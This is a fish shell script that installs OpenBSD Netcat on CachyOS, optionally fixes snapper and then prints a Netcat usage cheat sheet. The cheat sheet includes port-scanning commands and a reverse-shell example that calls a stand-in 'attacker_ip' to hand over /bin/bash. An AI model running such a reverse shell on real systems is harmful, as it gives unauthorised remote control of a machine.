#!/usr/bin/env fish
# === netcat.fish ===
# Purpose: Install Netcat (nc) network utility on CachyOS
# Installs OpenBSD Netcat from official repositories
# Author: theoneandonlywoj

echo "🚀 Starting Netcat installation..."

# === 1. Check if netcat is already installed ===
command -q nc; and set -l netcat_installed "installed"
if test -n "$netcat_installed"
    echo "✅ Netcat is already installed."
    nc -h 2>&1 | head -n 1
    read -P "Do you want to reinstall? [y/N] " reinstall
    if test "$reinstall" != "y" -a "$reinstall" != "Y"
        echo "⚠ Skipping Netcat installation."
        exit 0
    end
    echo "📦 Removing existing Netcat installation..."
    sudo pacman -R --noconfirm openbsd-netcat
    if test $status -ne 0
        echo "❌ Failed to remove Netcat."
        exit 1
    end
    echo "✅ Netcat removed."
end

# === 2. Install OpenBSD Netcat ===
echo "📦 Installing OpenBSD Netcat..."
sudo pacman -S --needed --noconfirm openbsd-netcat
if test $status -ne 0
    echo "❌ Failed to install Netcat."
    exit 1
end
echo "✅ Netcat installed."

# === 3. Check and fix snapper Boost library issue (if present) ===
if test -f /usr/bin/snapper
    echo
    echo "🔧 Checking for snapper Boost library issue..."
    snapper --version > /dev/null 2>&1
    if test $status -ne 0
        echo "⚠ Detected snapper Boost library version mismatch."
        echo "💡 This can happen after Boost updates."
        read -P "Do you want to fix snapper? [y/N] " fix_snapper
        
        if test "$fix_snapper" = "y" -o "$fix_snapper" = "Y"
            echo "📦 Reinstalling snapper to fix Boost library version mismatch..."
            sudo pacman -S --noconfirm snapper
            if test $status -eq 0
                echo "✅ Snapper fixed successfully."
            else
                echo "⚠ Failed to fix snapper, but Netcat is still fully functional."
            end
        end
    else
        echo "✅ Snapper is working correctly."
    end
end

# === 4. Verify installation ===
echo
echo "🧪 Verifying installation..."
command -q nc
if test $status -eq 0
    echo "✅ Netcat installed successfully"
    nc -h 2>&1 | head -n 1
else
    echo "❌ Netcat installation verification failed."
end

echo
echo "✅ Netcat installation complete!"
echo "💡 Netcat is the 'Swiss Army knife' of networking tools."
echo "💡 Basic Netcat commands:"
echo "   - nc [options] host port"
echo ""
echo "💡 Port scanning:"
echo "   - Scan open ports: nc -zv hostname 20-30"
echo "   - Check single port: nc -zv hostname 80"
echo "   - UDP scan: nc -u -zv hostname 53"
echo ""
echo "💡 File transfer:"
echo "   Receiver: nc -l port > file"
echo "   Sender: nc hostname port < file"
echo ""
echo "💡 Chat/Remote shell:"
echo "   Server: nc -l -p 8080"
echo "   Client: nc hostname 8080"
echo ""
echo "💡 Banner grabbing:"
echo "   nc hostname port"
echo ""
echo "💡 Reverse shell:"
echo "   Attacker: nc -l -p 4444"
echo "   Target: nc attacker_ip 4444 -e /bin/bash"
echo ""
echo "💡 Common options:"
echo "   -l: Listen mode (server)"
echo "   -p: Local port"
echo "   -v: Verbose output"
echo "   -z: Zero I/O (scanning)"
echo "   -u: UDP mode"
echo "   -e: Execute command"
echo "   -n: Don't resolve DNS"
echo "   -w: Timeout in seconds"
echo ""
echo "💡 Security note:"
echo "   - Use Netcat responsibly and only on systems you own or have permission to test"
echo "   - Reverse shells and unencrypted file transfers are security risks"
echo "   - Consider SSH for encrypted communication"
echo ""
echo "💡 Usage examples:"
echo "   1. Chat server:"
echo "      Server: nc -l 8080"
echo "      Client: nc localhost 8080"
echo ""
echo "   2. File transfer:"
echo "      Receiver: nc -l 8080 > received_file.txt"
echo "      Sender: nc localhost 8080 < file_to_send.txt"
echo ""
echo "   3. Port scan:"
echo "      nc -zv scanme.nmap.org 20-80"
echo ""
echo "   4. Simple HTTP server:"
echo "      while true; do (echo -e 'HTTP/1.1 200 OK\\r\\n\\r\\n'; date) | nc -l 8080; done"
echo ""

